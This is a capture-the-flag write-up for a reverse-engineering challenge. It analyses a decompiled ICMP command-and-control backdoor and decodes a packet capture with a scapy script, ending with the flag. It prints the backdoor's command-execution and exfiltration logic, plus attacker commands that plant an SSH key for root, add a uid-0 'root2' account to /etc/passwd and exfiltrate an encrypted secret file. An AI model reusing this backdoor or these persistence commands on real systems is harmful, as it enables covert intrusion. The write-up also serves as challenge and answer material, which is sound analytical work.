---
title: "N0PSCTF 2025 - Reverse Engineering - pwntopiashl"
description: "N0PSCTF 2025"
date: 2025-08-08
draft: false
author: "Lyes BOURENNANI"
---

# Context

We are provided with a PCAP file and a `stripped` ELF x86\_64 binary. We know that a machine on the network was compromised and some data was exfiltrated. We have to understand how it was done to retrieve the data and the flag. When opening the PCAP capture in Wireshark, we can see ICMP requests and responses. However some of the messages are malformed, which is suspicious.

```bash
file pwntopiashl capture.pcap
pwntopiashl:  ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7ea5fda28b3a88f7a5f8cf761870503215d8aa50, for GNU/Linux 3.2.0, not stripped
capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

Let's use a decompiler to see what the binary file hides. There are so security mechanisms that obfuscates the code, so the decompilation is comprehensible.

```c

int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  __int64 v4; // rdi

  v3 = time(0LL);
  v4 = v3;
  srand(v3);
  icmp_packet_listener(v4);
}

void __noreturn icmp_packet_listener()
{
  size_t v0; // rbx
  size_t v1; // rbx
  size_t v2; // rbx
  int v3; // eax
  struct sockaddr addr; // [rsp+0h] [rbp-C810h] BYREF
  char buf[2]; // [rsp+10h] [rbp-C800h] BYREF
  __int16 v6; // [rsp+12h] [rbp-C7FEh]
  char v7[8]; // [rsp+18h] [rbp-C7F8h] BYREF
  __int64 v8; // [rsp+20h] [rbp-C7F0h] BYREF
  __int16 v9; // [rsp+38h] [rbp-C7D8h]
  __int16 v10; // [rsp+3Ah] [rbp-C7D6h]
  char v11; // [rsp+3Ch] [rbp-C7D4h]
  char v12; // [rsp+3Dh] [rbp-C7D3h]
  __int16 v13; // [rsp+3Eh] [rbp-C7D2h]
  char dest[25536]; // [rsp+40h] [rbp-C7D0h] BYREF
  char s[20]; // [rsp+6400h] [rbp-6410h] BYREF
  char v16; // [rsp+6414h] [rbp-63FCh] BYREF
  int v17; // [rsp+C7C0h] [rbp-50h]
  unsigned int v18; // [rsp+C7C4h] [rbp-4Ch]
  FILE *stream; // [rsp+C7C8h] [rbp-48h]
  int v20; // [rsp+C7D0h] [rbp-40h]
  int v21; // [rsp+C7D4h] [rbp-3Ch]
  char *v22; // [rsp+C7D8h] [rbp-38h]
  char *v23; // [rsp+C7E0h] [rbp-30h]
  int fd; // [rsp+C7ECh] [rbp-24h]
  int i; // [rsp+C7F0h] [rbp-20h]
  int j; // [rsp+C7F4h] [rbp-1Ch]
  int v27; // [rsp+C7F8h] [rbp-18h]
  unsigned int v28; // [rsp+C7FCh] [rbp-14h]

  fd = socket(2, 3, 1);
  if ( fd < 0 )
    exit(1);
  while ( 1 )
  {
    do
      memset(s, 0, 0x63C0uLL);
    while ( recv(fd, s, 0x63BFuLL, 0) <= 0 );
    v23 = s;
    v22 = &v16;
    v21 = 28;
    if ( v16 == 12 && v22[1] == 35 )
    {
      v9 = *((_WORD *)v22 + 1);
      LOBYTE(v10) = rand();
      HIBYTE(v10) = rand();
      v11 = v9 ^ HIBYTE(v9);
      v12 = v10 ^ HIBYTE(v10);
      v13 = v9 ^ v10;
      memset(buf, 0, 0x20uLL);
      addr.sa_family = 2;
      *(_DWORD *)&addr.sa_data[2] = *((_DWORD *)v23 + 3);
      buf[0] = 0;
      v6 = v10;
      sleep(1u);
      sendto(fd, buf, v20 + 8LL, 0, &addr, 0x10u);
    }
    if ( *v22 == 19 && v22[1] == 42 )
    {
      addr.sa_family = 2;
      *(_DWORD *)&addr.sa_data[2] = *((_DWORD *)v23 + 3);
      memset(dest, 0, sizeof(dest));
      memcpy(dest, &s[v21], (unsigned int)(25535 - v21));
      for ( i = 25536; ; --i )
      {
        v0 = i;
        if ( v0 < strlen(dest) || dest[i - 1] )
          break;
      }
      for ( j = 0; j < i; ++j )
        dest[j] ^= *((_BYTE *)&v9 + (j & 7));
      puts(dest);
      fflush(_bss_start);
      stream = popen(dest, "r");
      if ( stream )
      {
        memset(dest, 0, sizeof(dest));
        memset(s, 0, 0x63C0uLL);
        while ( fgets(s, 25536, stream) )
        {
          v1 = strlen(dest);
          if ( v1 + strlen(s) > 0x63BE )
            break;
          strcat(dest, s);
        }
        pclose(stream);
        i = strlen(dest);
        for ( j = 0; j < i; ++j )
          dest[j] ^= *((_BYTE *)&v9 + (j & 7));
        for ( i = 25536; ; --i )
        {
          v2 = i;
          if ( v2 < strlen(dest) || dest[i - 1] )
            break;
        }
        v27 = 0;
        v28 = i;
        v18 = ((unsigned __int64)i >> 4) + 1;
        for ( j = 0; j < (int)v18; ++j )
        {
          memset(buf, 0, 0x20uLL);
          buf[0] = 8;
          v3 = v28;
          if ( v28 > 0x10 )
            v3 = 16;
          v17 = v3;
          sprintf(v7, "%04d%04d", (unsigned int)(j + 1), v18);
          memcpy(&v8, &dest[v27], v17);
          v27 += v17;
          v28 -= v17;
          sleep(1u);
          sendto(fd, buf, v17 + 16LL, 0, &addr, 0x10u);
        }
      }
    }
  }
}
```

We can clearly see that the program listens to ICMP messages. However, on certain conditions, some things are done.

# Hanshake

However, it seems that there are checks on the ICMP header. If it contains certain values as header, some actions are done.
Firstly, if the header is `b’\x0c\x23’`, then we take some of the data from the message and create a cipher key with randomly generated data using the pseudo-random generator from the `libc` (`srand()`, `rand()`). We also see at the end that we send back the randomly generated short. This is some form of hanshake.

```c
if ( v16 == 12 && v22[1] == 35 )
    {
      v9 = *((_WORD *)v22 + 1);
      LOBYTE(v10) = rand();
      HIBYTE(v10) = rand();
      v11 = v9 ^ HIBYTE(v9);
      v12 = v10 ^ HIBYTE(v10);
      v13 = v9 ^ v10;
      memset(buf, 0, 0x20uLL);
      addr.sa_family = 2;
      *(_DWORD *)&addr.sa_data[2] = *((_DWORD *)v23 + 3);
      buf[0] = 0;
      v6 = v10;
      sleep(1u);
      sendto(fd, buf, v20 + 8LL, 0, &addr, 0x10u);
    }
```

# Command & Control

If the header is `b'\x13\x2A'`, we see that we retrieve the data and decipher it using XOR cipher with the key generated at handshake. Then, the deciphered data is given as an argument in `popen`, which means deciphered data should be commands, then the output is ciphered with the same key and ready to be exfiltrated. This is some kind of Command & Control (C2) backdoor mechanism.

```c
 if ( *v22 == 19 && v22[1] == 42 )
    {
      addr.sa_family = 2;
      *(_DWORD *)&addr.sa_data[2] = *((_DWORD *)v23 + 3);
      memset(dest, 0, sizeof(dest));
      memcpy(dest, &s[v21], (unsigned int)(25535 - v21));
      for ( i = 25536; ; --i )
      {
        v0 = i;
        if ( v0 < strlen(dest) || dest[i - 1] )
          break;
      }
      for ( j = 0; j < i; ++j )
        dest[j] ^= *((_BYTE *)&v9 + (j & 7));
      puts(dest);
      fflush(_bss_start);
      stream = popen(dest, "r");
      if ( stream )
      {
        memset(dest, 0, sizeof(dest));
        memset(s, 0, 0x63C0uLL);
        while ( fgets(s, 25536, stream) )
        {
          v1 = strlen(dest);
          if ( v1 + strlen(s) > 0x63BE )
            break;
          strcat(dest, s);
        }
        pclose(stream);
        i = strlen(dest);
        for ( j = 0; j < i; ++j )
          dest[j] ^= *((_BYTE *)&v9 + (j & 7));
        for ( i = 25536; ; --i )
        {
          v2 = i;
          if ( v2 < strlen(dest) || dest[i - 1] )
            break;
        }
        v27 = 0;
        v28 = i;
        v18 = ((unsigned __int64)i >> 4) + 1;
        for ( j = 0; j < (int)v18; ++j )
        {
          memset(buf, 0, 0x20uLL);
          buf[0] = 8;
          v3 = v28;
          if ( v28 > 0x10 )
            v3 = 16;
          v17 = v3;
          sprintf(v7, "%04d%04d", (unsigned int)(j + 1), v18);
          memcpy(&v8, &dest[v27], v17);
          v27 += v17;
          v28 -= v17;
          sleep(1u);
          sendto(fd, buf, v17 + 16LL, 0, &addr, 0x10u);
        }
      }
```

# Retrieval of the executed commands

Since we have the network capture, we can decipher the data and see what was done on the compromised machine. I developed a small script. We simply iterate on packets. If the packet has the key handshake header, we build the key. If it's the command execution, we decipher the command used and its output using the current key. The script uses `scapy` to easily iterate on ICMP messages.

```python=
# decode_c2_data.py
from scapy.all import *
from itertools import cycle

def generate_xor_key(key: int, r: int) -> bytes:
    key_lo = key & 0xFF
    key_hi = (key >> 8) & 0xFF
    r_lo = r & 0xFF
    r_hi = (r >> 8) & 0xFF
    kxor = key ^ r
    return bytes([
        key_lo,
        key_hi,
        r_lo,
        r_hi,
        key_hi ^ key_lo,
        r_hi ^ r_lo,
        kxor & 0xFF,
        (kxor >> 8) & 0xFF
    ])

def dump_data(pcap_path):
    packets = rdpcap(pcap_path)

    key = None
    for i in range(len(packets)):
        data = bytes(packets[i][ICMP])

        if i != len(packets) - 1:
            next_data = bytes(packets[i + 1][ICMP])

        if data[0:2] == b'\x0c\x23':
            first = int.from_bytes(data[2:4], byteorder='little')
            second = int.from_bytes(next_data[2:4], byteorder='little')
            print(f"Key init found! first = {hex(first)} & second = {hex(second)}")
            key = generate_xor_key(first, second)
        elif data[0:2] == b'\x13\x2A':
            cipher = data[8:]
            plain = "".join([chr(a ^ b) for a,b in zip(cipher, cycle(key))])
            print(f"Found plain: {plain}")
        else:
            cipher = data[8:]
            plain = "".join([chr(a ^ b) for a,b in zip(cipher, cycle(key))])
            plain = plain[8:]
            print(f"{plain}")

dump_data("capture.pcap")
```

Here is the output of our little script :

```bash
python3 decode_c2_data.py

Key init found! first = 0xada & second = 0xe0de

Found plain: id
uid=0(root) gid=
0(root) groups=0
(root)

Found plain: mkdir /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx+J8mv79rAqohohfdnzJDBS6wfnl1RT0CUeIYqqoWv7VTgiCMmmG7ww4jfWtX4IXb6KN1uO17Jpfqod0brs3QHgiwpwhGbdurPMGbZwmJaXdCbf69ZTzf1YYn9xv5SxUrlGg9/UAs2QbHPt0rcrv5Y7b47IUodm8H9P6SiVddhGIpRViToBJZ83leGaTMfH2W9moWfMtcNegNmrIc3ObfLa0/T03Ag2nwjNkoBOwbR/S5wsQYuEufDHNF4eAeWKI+UsRB19yrKOmrsrlnQ831JSiYQ5VCDcchyHW2FqEkf/LK4mBE2Y/u8etAwzgi9dVbO4dhV1cG4JdUE5X/mhphktZM0zy3/i6AstWKalDyUnKSRkFi+iAm3bj5rg6eZsbWXzoiOQHvIjBtjkTIaneufmLMqj5rNUnOgBI1glAMp5rDewqH5Wga90lddtBDN698ULoIQR+TTe/1fryGcBcKNXiRBfe2fqqK0i9wOY20xu/4tPZAilo/RQxKBXEq5gs=' > /root/.ssh/id_rsa.pub

Found plain: cat /root/.ssh/id_rsa.pub
ssh-rsa AAAAB3Nz
aC1yc2EAAAADAQAB
AAABgQCx+J8mv79r
AqohohfdnzJDBS6w
fnl1RT0CUeIYqqoW
v7VTgiCMmmG7ww4j
fWtX4IXb6KN1uO17
Jpfqod0brs3QHgiw
pwhGbdurPMGbZwmJ
aXdCbf69ZTzf1YYn
9xv5SxUrlGg9/UAs
2QbHPt0rcrv5Y7b4
7IUodm8H9P6SiVdd
hGIpRViToBJZ83le
GaTMfH2W9moWfMtc
NegNmrIc3ObfLa0/
T03Ag2nwjNkoBOwb
R/S5wsQYuEufDHNF
4eAeWKI+UsRB19yr
KOmrsrlnQ831JSiY
Q5VCDcchyHW2FqEk
f/LK4mBE2Y/u8etA
wzgi9dVbO4dhV1cG
4JdUE5X/mhphktZM
0zy3/i6AstWKalDy
UnKSRkFi+iAm3bj5
rg6eZsbWXzoiOQHv
IjBtjkTIaneufmLM
qj5rNUnOgBI1glAM
p5rDewqH5Wga90ld
dtBDN698ULoIQR+T
Te/1fryGcBcKNXiR
Bfe2fqqK0i9wOY20
xu/4tPZAilo/RQxK
BXEq5gs=

Key init found! first = 0xff3c & second = 0xe8b4

Found plain: openssl passwd pwnt0p14
$1$d0QECrET$duOS
z/ZMGfKaSPgyxagI
n0

Found plain: echo 'root2:$1$d0QECrET$duOSz/ZMGfKaSPgyxagIn0:0:0:root:/root:/bin/bash' >> /etc/passwd

Found plain: tail -n 1 /etc/passwd
root2:$1$d0QECrE
T$duOSz/ZMGfKaSP
gyxagIn0:0:0:roo
t:/root:/bin/bas
h

Key init found! first = 0xaea & second = 0x44dc

Found plain: pwd
/tmp/pwntopia

Found plain: ls -la
total 44
drwxr-x
r-x  2 root root
  4096 Mar 10 17
:18 .
drwxrwxrwt
 29 root root 16
384 Mar 10 17:50
 ..
-rwxr-xr-x
1 root root 1688
0 Mar 10 17:49 p
wntopiashl
-rw-r
--r--  1 root ro
ot    31 Mar 10
17:18 .secret

Found plain: cat .secret | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops
U2FsdGVkX1+sDd5g
4JCxThLBMo/IsCKi
wxriZAOdcfL7Y8ce
jGFLo3jpAiyuyx7o


Key init found! first = 0x3d56 & second = 0x7093
```

We can see that the attacker added persistence by adding a RSA SSH public key to the root user. Then, he created a `root2` user by appending `root2:$1$d0QECrET$duOSz/ZMGfKaSPgyxagIn0:0:0:root:/root:/bin/bash` to `/etc/passwd`. We also can see that the `.secret` file was exfiltrated. Since we retrieved the commands, we just have to take the ciphered `.secret` file and decipher it using the password `we_pwned_nops` and `openssl`.

```bash
cat > cipher.txt <<EOF
U2FsdGVkX1+sDd5g
4JCxThLBMo/IsCKi
wxriZAOdcfL7Y8ce
jGFLo3jpAiyuyx7o
EOF

openssl enc -aes-256-cbc -d -a -salt -pbkdf2 -pass pass:we_pwned_nops -in cipher.txt
N0PS{v3Ry_s734lThY_1cMP_sh3Ll}
```
